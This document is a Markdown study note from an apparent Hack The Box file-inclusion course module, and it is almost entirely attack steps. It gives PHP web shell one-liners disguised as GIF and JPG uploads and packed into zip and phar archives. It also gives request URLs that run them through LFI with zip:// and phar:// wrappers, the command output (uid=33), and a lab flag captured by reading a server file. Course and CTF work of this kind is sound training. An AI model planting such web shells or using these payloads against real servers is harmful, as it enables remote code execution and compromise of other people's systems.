---
tags: [CWES, HTB, technical-reference]
module: "File Inclusion"
source_file: "CWES.xmind"
---

# LFI and File Uploads

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## If the vulnerable function has code Execute capabilities

## PHP

### Crafting Malicious Image

- echo 'GIF8<?<!-- -->php system($_GET["cmd"]); ?>' > shell.gif
### go to the Profile Settings

- upload and our image
### Uploaded File Path

- inspect the source code
### PHP code should get executed

- http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
  - GIF8uid=33
## Zip Upload

### echo '<?<!-- -->php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

### http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

- uid=33
## Phar Upload

### shell.php file

- <?<!-- -->php  
  $phar = new Phar('shell.phar');  
  $phar->startBuffering();  

  $phar->addFromString(  
  'shell.txt',  
  '<?<!-- -->php system($_GET["cmd"]); ?>'  
  );  

  $phar->setStub('<?<!-- -->php __HALT_COMPILER(); ?>');  

  $phar->stopBuffering();  
  ?>
### compile it into a phar file and rename it to shell.jpg

- php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
### upload it to the web application, we can simply call it with phar://

- http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
  - uid=33
## LAB

### Use any of the techniques covered in this section to gain RCE and read the flag at /

- echo '<?<!-- -->php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
- http://154.57.164.70:30183/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt
  - HTB{upl04d+lf!+3x3cut3=rc3}
